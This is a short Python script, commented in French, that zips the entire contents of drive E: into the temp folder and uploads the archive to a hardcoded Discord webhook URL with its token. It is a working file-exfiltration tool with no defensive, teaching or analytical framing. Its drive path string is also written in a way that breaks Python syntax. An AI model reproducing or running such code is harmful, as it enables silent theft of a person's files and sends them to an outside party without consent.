import requests
import shutil
import os

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410619274720055317/-V4w7U5MKF7ggn6xFGrDZfFm4JYzdhQ0wywW7EKzzVS22a2FbCXqI6rXMtj-kjhHM54C"

drive_path = r"E:\"

zip_path = os.path.join(os.getenv("TEMP"), "folder.zip")

shutil.make_archive(zip_path.replace(".zip", ""), 'zip', drive_path)

with open(zip_path, "rb") as f:
    response = requests.post(
        WEBHOOK_URL,
        files={"file": (os.path.basename(zip_path), f)}
    )

print("Upload terminé ! Status:", response.status_code)
